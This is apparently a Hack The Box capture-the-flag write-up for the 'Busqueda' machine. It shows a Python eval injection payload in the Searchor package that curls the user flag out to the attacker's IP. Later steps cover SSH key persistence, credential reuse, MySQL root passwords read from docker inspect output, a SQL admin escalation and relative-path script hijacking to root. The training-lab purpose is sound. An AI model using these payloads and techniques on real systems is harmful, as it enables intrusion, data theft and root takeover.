---
title: "Busqueda Writeup"
date: 2023-04-18T23:47:41-04:00
draft: false
toc: false
images:
tags:
  - hackthebox
  - linux
  - hacking
---

![Busqueda.png](../../img/Busqueda.png)

## User Owning:

We start off by running a simple Nmap scan on the machine and get the following:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We check out the site running on port 80 and are greeted with the following:

![Untitled](../../img/Untitled.png)

At the bottom of the page we also see the following:

![Untitled](../../img/Untitled%201.png)

It seems like the a package named “Searchor” is used in this application. After some googling, we find the [official repository for Searchor](https://github.com/ArjunSharda/Searchor). 

After doing some digging on potential vulnerabilities on Searchor, I found the following:

[https://github.com/ArjunSharda/Searchor/pull/130](https://github.com/ArjunSharda/Searchor/pull/130)

The version of Searchor used by this application is vulnerable to remote code execution via the `eval` function in Python.

Looking at the commits in the pull request, we can see the vulnerable code:

![Untitled](../../img/Untitled%202.png)

Assuming our inputs in the application are eventually passed through this function within the Searchor package, we can craft an input to execute arbitrary code. 

The following search query should make the server execute code to send an HTTP request containing the user flag, to a listening connection I will create using Netcat:

```python
hello', copy_url=__import__("os").system("curl http://<MY IP>:5000/`cat ~/user.txt`"), open_web=False) #
```

And it works!

![Untitled](../../img/Untitled%203.png)

We now own the user!

To get a nice shell in the machine, I used the vulnerability above to create a directory `~/.ssh` and a file within it called `authorized_keys` which contained my SSH public key. This allowed me to authenticate through SSH using keys. 

![Untitled](../../img/Untitled%204.png)

## Privilege Escalation:

After looking around the server’s filesystem, I found some interesting things.

First, looking at the `/etc/hosts` file, I found that there is a `gitea` subdomain running on the server:

![Untitled](../../img/Untitled%205.png)

Once I navigate to the gitea subdomain, I’m greeted with a pretty standard Gitea instance. 

![Untitled](../../img/Untitled%206.png)

After exploring the page, I find that there are only two users both with no public repositories:

![Untitled](../../img/Untitled%207.png)

After looking through the server’s filesystem a bit more, I find the following:

In `/var/www/app` which is where the Searcher app we previous saw is running, there is a `.git` directory. 

Inside it, we find a `config` file. Upon opening it’s contents, we find Cody’s Gitea password: 

![Untitled](../../img/Untitled%208.png)

Another interesting thing we found is inside the `/opt/scripts` directory. There are 4 scripts owned by `root` which I cannot read, write, nor execute.

![Untitled](../../img/Untitled%209.png)

Maybe the `administrator` user on Gitea has the scripts in a private repository.

Anyways, I log into Gitea now as Cody using the username “cody” and the password we just found.

I find a private repository on his account containing the code to the Searcher web app we previously exploited. Nothing really interesting here, so we move on.

![Untitled](../../img/Untitled%2010.png)

After trying to see if Cody’s Gitea password was reused as his sudo password, it works!

After executing `sudo -l` and entering the password, we are given the following: 

![Untitled](../../img/Untitled%2011.png)

This means the only thing we can run with sudo is:

```bash
/usr/bin/python3 /opt/scripts/system-checkup.py <ARGUMENTS>
```

Which so happens to be the scripts we previously mentioned. 

After learning how to use the script, and running the following:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```

We get all the docker containers running on the machine:

```text
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 2 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 2 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

We then run the following:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect "{{json .Config}}" mysql_db
```

Which is the equivalent of running `docker inspect "{{json .Config}}" mysql_db` with the Docker CLI.

We get the following output (nicely formatted):

```json
{
  "Hostname": "f84a6b33fb5a",
  "Domainname": "",
  "User": "",
  "AttachStdin": false,
  "AttachStdout": false,
  "AttachStderr": false,
  "ExposedPorts": {
    "3306/tcp": {},
    "33060/tcp": {}
  },
  "Tty": false,
  "OpenStdin": false,
  "StdinOnce": false,
  "Env": [
    "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
    "MYSQL_USER=gitea",
    "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
    "MYSQL_DATABASE=gitea",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "GOSU_VERSION=1.14",
    "MYSQL_MAJOR=8.0",
    "MYSQL_VERSION=8.0.31-1.el8",
    "MYSQL_SHELL_VERSION=8.0.31-1.el8"
  ],
  "Cmd": [
    "mysqld"
  ],
  "Image": "mysql:8",
  "Volumes": {
    "/var/lib/mysql": {}
  },
  "WorkingDir": "",
  "Entrypoint": [
    "docker-entrypoint.sh"
  ],
  "OnBuild": null,
  "Labels": {
    "com.docker.compose.config-hash": "1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b",
    "com.docker.compose.container-number": "1",
    "com.docker.compose.oneoff": "False",
    "com.docker.compose.project": "docker",
    "com.docker.compose.project.config_files": "docker-compose.yml",
    "com.docker.compose.project.working_dir": "/root/scripts/docker",
    "com.docker.compose.service": "db",
    "com.docker.compose.version": "1.29.2"
  }
}
```

The 2 things that stand out are the `MYSQL_DATABASE`, and `MYSQL_ROOT_PASSWORD`. Naturally, with this information, we attempt to log into MySQL as the `root` MySQL user (not the same as the Linux `root` user):

![Untitled](../../img/Untitled%2012.png)

And it works!

We then select the `gitea` database in MySQL, and list all the tables:

```text
+---------------------------+
| Tables_in_gitea           |
+---------------------------+
| access                    |
| access_token              |
| action                    |
| app_state                 |
| attachment                |
| badge                     |
| collaboration             |
| comment                   |
| commit_status             |
| commit_status_index       |
| deleted_branch            |
| deploy_key                |
| email_address             |
| email_hash                |
| external_login_user       |
| follow                    |
| foreign_reference         |
| gpg_key                   |
| gpg_key_import            |
| hook_task                 |
| issue                     |
| issue_assignees           |
| issue_content_history     |
| issue_dependency          |
| issue_index               |
| issue_label               |
| issue_user                |
| issue_watch               |
| label                     |
| language_stat             |
| lfs_lock                  |
| lfs_meta_object           |
| login_source              |
| milestone                 |
| mirror                    |
| notice                    |
| notification              |
| oauth2_application        |
| oauth2_authorization_code |
| oauth2_grant              |
| org_user                  |
| package                   |
| package_blob              |
| package_blob_upload       |
| package_file              |
| package_property          |
| package_version           |
| project                   |
| project_board             |
| project_issue             |
| protected_branch          |
| protected_tag             |
| public_key                |
| pull_auto_merge           |
| pull_request              |
| push_mirror               |
| reaction                  |
| release                   |
| renamed_branch            |
| repo_archiver             |
| repo_indexer_status       |
| repo_redirect             |
| repo_topic                |
| repo_transfer             |
| repo_unit                 |
| repository                |
| review                    |
| review_state              |
| session                   |
| star                      |
| stopwatch                 |
| system_setting            |
| task                      |
| team                      |
| team_invite               |
| team_repo                 |
| team_unit                 |
| team_user                 |
| topic                     |
| tracked_time              |
| two_factor                |
| upload                    |
| user                      |
| user_badge                |
| user_open_id              |
| user_redirect             |
| user_setting              |
| version                   |
| watch                     |
| webauthn_credential       |
| webhook                   |
+---------------------------+
```

After checking the column names of the `user` table, I notice there is an `is_admin` column. So I check its value for each user:

![Untitled](../../img/Untitled%2013.png)

I run the following query to set the `is_admin` value for `cody` to 1:

```sql
UPDATE user SET is_admin = 1 WHERE name = "cody";
```

This now makes Cody an admin on the Gitea instance. 

If we go back to the Gitea instance, we can now see `administrator`'s private repositories. Only 1 repository exists which contains the source code of the scripts we previously found in `/opt/scripts`. Jack pot!

![Untitled](../../img/Untitled%2014.png)

We download the scripts to inspect their source code. 

After looking at the `system-checkup.py` script, I notice the following lines:

```python
elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']
        print(run_command(arg_list))
        print('[+] Done!')
    except:
        print('Something went wrong')
        exit(1)
```

When we run:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

The `full-checkup.sh` script runs (one of the 4 scripts we downloaded). We is interesting is that the script is ran using its RELATIVE PATH instead of its ABOSLUTE PATH:

```python
arg_list = ['./full-checkup.sh']
print(run_command(arg_list))
```

A relative path is a path relative to your current directory. An absolute path is a path relative to the `/` directory. This means that the script assumes we are in the `/opt/scripts` directory in order to run the `full-checkup.sh` script in the same directory. 

If we navigate to another directory, and create another `full-checkup.sh` script containing any command we want, when running `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`, the script we made will be ran as `root`. 

We navigate to another directory and create a `full-checkup.sh` script containing the following:

```bash
#!/bin/bash
cat /root/root.txt
```

In order to get the root flag. 

Made sure to run `chmod +x full-checkup.sh` to allow us to execute it as a program. 

We then run:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

And boom! Our script gets executed and we successfully printed the root flag!

![Untitled](../../img/Untitled%2015.png)

### System owned!

# Busqueda has been pwned!

To get an actual root shell, just change the `full-checkup.sh` file you created to add your SSH public key to a `/root/.ssh/authorized_keys` file and simply log in as root through SSH (root SSH login is enabled on this server).

![Untitled](../../img/image.png)